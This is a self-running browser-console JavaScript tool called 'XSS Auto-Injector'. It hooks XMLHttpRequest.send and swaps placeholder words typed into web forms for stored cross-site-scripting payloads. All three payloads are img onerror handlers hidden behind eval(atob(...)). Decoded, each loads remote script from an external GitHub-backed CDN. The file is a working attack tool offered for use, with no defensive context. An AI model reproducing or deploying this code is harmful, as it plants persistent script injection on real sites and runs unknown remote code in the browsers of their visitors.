// XSS Auto-Injector - Headless Console Version
(function() {
    const brand = '🔥 XSS Auto-Injector (Console Only) 🔥';
    console.log(`%c ${brand} `, 'background: #222; color: #0f0; font-size: 14px; font-weight: bold; border: 1px solid #0f0;');

    const payloads = {
        'payload_1': {
            name: 'Quebec Libre',
            value: '<img/src/onerror=\'eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC91bmRldGVjdGFibGVzZXJ2aWNlcy9wYXlsb2FkcGVudGVzdEByZWZzL2hlYWRzL21haW4vbWFpbnBheWxvYWQuanM/dj0nK0RhdGUubm93KCk7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzKQ=="))\'>'
        },
        'payload_2': {
            name: 'Mod Menu',
            value: '<img/src/onerror=\'eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC91bmRldGVjdGFibGVzZXJ2aWNlcy9wYXlsb2FkcGVudGVzdEByZWZzL2hlYWRzL21haW4vbW9kbWVudS5qcz92PScrRGF0ZS5ub3coKTtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMp"))\'>'
        },
        'payload_3': {
            name: 'Floater',
            value: '<img/src/onerror=\'eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC91bmRldGVjdGFibGVzZXJ2aWNlcy9wYXlsb2FkcGVudGVzdEByZWZzL2hlYWRzL21haW4vcGF5bG9hZDMuanM/dj0nK0RhdGUubm93KCk7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzKQ=="))\'>'
        }
    };

    let stats = {
        intercepts: 0,
        replacements: 0
    };

    // Helper to log status in a clean format
    const logAction = (msg, data = null) => {
        console.log(`%c[INJECTOR]%c ${msg}`, 'color: #0f0; font-weight: bold;', 'color: #ddd;');
        if (data) console.dir(data);
    };

    // Public helper to show available payloads in console
    window.listPayloads = () => {
        console.table(payloads);
        console.log('Usage: Type one of the keys above into an input field and submit.');
    };

    // Public helper to check stats
    window.injectorStats = () => {
        console.table(stats);
    };

    // Intercept XHR
    const originalXHRSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(data) {
        if (!data || typeof data !== 'string') {
            return originalXHRSend.call(this, data);
        }

        let modified = data;
        let replaced = false;

        for (let [placeholder, payloadData] of Object.entries(payloads)) {
            if (data.includes(placeholder)) {
                const params = new URLSearchParams(data);
                
                for (let [key, value] of params.entries()) {
                    if (value.includes(placeholder)) {
                        const newValue = value.replace(new RegExp(placeholder, 'g'), payloadData.value);
                        params.set(key, newValue);
                        replaced = true;
                        stats.replacements++;
                        logAction(`🎯 Target matched: ${placeholder} in parameter [${key}]`);
                    }
                }

                if (replaced) {
                    modified = params.toString();
                    stats.intercepts++;
                    logAction('🚀 Request Modified & Sent', { original: data, modified: modified });
                }
            }
        }

        return originalXHRSend.call(this, modified);
    };

    logAction('Ready. Type %clistPayloads()%c to see triggers.', 'color: #ff0', 'color: #ddd');
})();
